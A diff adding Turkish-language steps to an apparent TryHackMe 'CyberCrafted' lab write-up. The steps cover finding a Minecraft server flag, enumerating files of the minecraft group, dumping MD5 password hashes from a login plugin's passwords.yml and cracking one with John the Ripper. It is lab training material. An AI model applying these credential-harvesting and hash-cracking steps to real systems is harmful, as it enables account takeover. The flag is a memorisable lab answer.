@@ -615,7 +615,7 @@ xxultimatecreeperxx@cybercrafted:~$ export TERM=xterm
 xxultimatecreeperxx@cybercrafted:~$ 
 ```
 
-Minecraft server flag
+Minecraft server bayrağını bulalım. 
 
 ```
 xxultimatecreeperxx@cybercrafted:/$ find / -name "minecraft_server_flag.txt" 2>/dev/null
@@ -626,4 +626,152 @@ xxultimatecreeperxx@cybercrafted:/$ cat /opt/minecraft/minecraft_server_flag.txt
 THM{ba93767ae3db9f5b8399680040a0c99e}
 xxultimatecreeperxx@cybercrafted:/$ 
 ```
+
+Kullanıcımız minecraft grubunda
+
+```
+xxultimatecreeperxx@cybercrafted:/$ id
+uid=1001(xxultimatecreeperxx) gid=1001(xxultimatecreeperxx) groups=1001(xxultimatecreeperxx),25565(minecraft)
+xxultimatecreeperxx@cybercrafted:/$ 
+```
+
+Bu grubun hangi dosyaları görüntüleyebileceğine bakalım.
+
+```
+xxultimatecreeperxx@cybercrafted:/$ find / -type f -group minecraft 2>/dev/null
+/opt/minecraft/note.txt
+/opt/minecraft/minecraft_server_flag.txt
+/opt/minecraft/cybercrafted/help.yml
+/opt/minecraft/cybercrafted/commands.yml
+/opt/minecraft/cybercrafted/world/level.dat_mcr
+/opt/minecraft/cybercrafted/world/session.lock
+/opt/minecraft/cybercrafted/world/DIM-1/data/villages.dat
+/opt/minecraft/cybercrafted/world/DIM-1/forcedchunks.dat
+/opt/minecraft/cybercrafted/world/playerdata/77f6b2f8-e83c-458d-9795-6487671ad59f.dat
+/opt/minecraft/cybercrafted/world/DIM1/data/villages.dat
+/opt/minecraft/cybercrafted/world/DIM1/forcedchunks.dat
+/opt/minecraft/cybercrafted/world/data/villages_nether.dat
+/opt/minecraft/cybercrafted/world/data/villages.dat
+/opt/minecraft/cybercrafted/world/data/villages_end.dat
+/opt/minecraft/cybercrafted/world/data/Fortress.dat
+/opt/minecraft/cybercrafted/world/forcedchunks.dat
+/opt/minecraft/cybercrafted/world/uid.dat
+/opt/minecraft/cybercrafted/world/stats/_madrins.json
+/opt/minecraft/cybercrafted/world/stats/hank20000.json
+/opt/minecraft/cybercrafted/world/stats/77f6b2f8-e83c-458d-9795-6487671ad59f.json
+/opt/minecraft/cybercrafted/world/players/hank20000.dat
+/opt/minecraft/cybercrafted/world/players/_madrins.dat
+/opt/minecraft/cybercrafted/world/region/r.-2.-3.mca
+/opt/minecraft/cybercrafted/world/region/r.-1.-2.mca
+/opt/minecraft/cybercrafted/world/region/r.-1.0.mca
+/opt/minecraft/cybercrafted/world/region/r.-2.-1.mca
+/opt/minecraft/cybercrafted/world/region/r.0.0.mca
+/opt/minecraft/cybercrafted/world/region/r.-3.0.mca
+/opt/minecraft/cybercrafted/world/region/r.-1.-1.mca
+/opt/minecraft/cybercrafted/world/region/r.-2.0.mca
+/opt/minecraft/cybercrafted/world/region/r.-3.-2.mca
+/opt/minecraft/cybercrafted/world/region/r.-3.-3.mca
+/opt/minecraft/cybercrafted/world/region/r.-3.-1.mca
+/opt/minecraft/cybercrafted/world/region/r.-2.-2.mca
+/opt/minecraft/cybercrafted/world/region/r.0.-1.mca
+/opt/minecraft/cybercrafted/permissions.yml
+/opt/minecraft/cybercrafted/server-icon.png
+/opt/minecraft/cybercrafted/world_the_end/session.lock
+/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.0.mca
+/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.0.mca
+/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.-1.mca
+/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.-1.mca
+/opt/minecraft/cybercrafted/world_the_end/uid.dat
+/opt/minecraft/cybercrafted/white-list.txt
+/opt/minecraft/cybercrafted/craftbukkit-1.7.2-server.jar
+/opt/minecraft/cybercrafted/world_nether/session.lock
+/opt/minecraft/cybercrafted/world_nether/level.dat_old
+/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.0.mca
+/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.0.mca
+/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.-1.mca
+/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.-1.mca
+/opt/minecraft/cybercrafted/world_nether/level.dat
+/opt/minecraft/cybercrafted/world_nether/uid.dat
+/opt/minecraft/cybercrafted/plugins/LoginSystem_v.2.4.jar
+/opt/minecraft/cybercrafted/plugins/LoginSystem/settings.yml
+/opt/minecraft/cybercrafted/plugins/LoginSystem/passwords.yml
+/opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt
+/opt/minecraft/cybercrafted/plugins/LoginSystem/language.yml
+/opt/minecraft/cybercrafted/logs/2021-06-28-2.log.gz
+/opt/minecraft/cybercrafted/logs/2021-06-27-2.log.gz
+/opt/minecraft/cybercrafted/logs/2021-09-12-3.log.gz
+/opt/minecraft/cybercrafted/logs/2021-09-12-5.log.gz
+/opt/minecraft/cybercrafted/logs/2021-06-27-3.log.gz
+/opt/minecraft/cybercrafted/logs/2021-06-27-1.log.gz
+/opt/minecraft/cybercrafted/logs/2021-09-12-4.log.gz
+/opt/minecraft/cybercrafted/logs/2021-09-12-2.log.gz
+/opt/minecraft/cybercrafted/logs/2021-06-28-1.log.gz
+/opt/minecraft/cybercrafted/logs/2021-09-12-1.log.gz
+/opt/minecraft/cybercrafted/server.properties
+/opt/minecraft/cybercrafted/ops.txt
+/opt/minecraft/cybercrafted/bukkit.yml
+/opt/minecraft/cybercrafted/banned-ips.txt
+/opt/minecraft/cybercrafted/banned-players.txt
+xxultimatecreeperxx@cybercrafted:/$
+```
+
+note.txt dosyası buluyoruz.
+
+```
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ ls
+WorldBackup  cybercrafted  minecraft_server_flag.txt  note.txt
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt 
+Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
+- cybercrafted
+
+P.S
+Will remove the whitelist soon.
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ 
+```
+
+note.txt de verilen bilgilerden ilerleyelim. Konfigürasyon dosyalarını okumaya çalışalım.
+
+```
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cd cybercrafted/
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ ls
+banned-ips.txt      commands.yml                  logs             plugins            white-list.txt  world_the_end
+banned-players.txt  craftbukkit-1.7.2-server.jar  ops.txt          server-icon.png    world
+bukkit.yml          help.yml                      permissions.yml  server.properties  world_nether
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ 
+```
+
+2 tane hash bulduk.
+
+```
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ cd plugins/
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls -la
+total 56
+drwxr-x--- 3 cybercrafted minecraft  4096 Jun 27  2021 .
+drwxr-x--- 7 cybercrafted minecraft  4096 Jun 27  2021 ..
+drwxr-x--- 2 cybercrafted minecraft  4096 Oct  6  2021 LoginSystem
+-rwxr-x--- 1 cybercrafted minecraft 43514 Jun 27  2021 LoginSystem_v.2.4.jar
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ cd LoginSystem/
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ ls
+language.yml  log.txt  passwords.yml  settings.yml
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml 
+cybercrafted: dcbf543ee264e2d3a32c967d663e979e
+madrinch: 42f749ade7f9e195bf475f37a44cafcb
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$
+```
+
+Bulduğumuz hashleri bir dosyaya kaydedelim ve john the ripper kullanarak hashleri kıralım.
+
+```
+john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Password123      (madrinch)
+1g 0:00:00:01 DONE (2023-07-15 21:14) 0.8064g/s 11567Kp/s 11567Kc/s 11594KC/s  fuckyooh21..*7¡Vamos!
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed
+```
+ Hash'i kırmayı başardık.
+
 
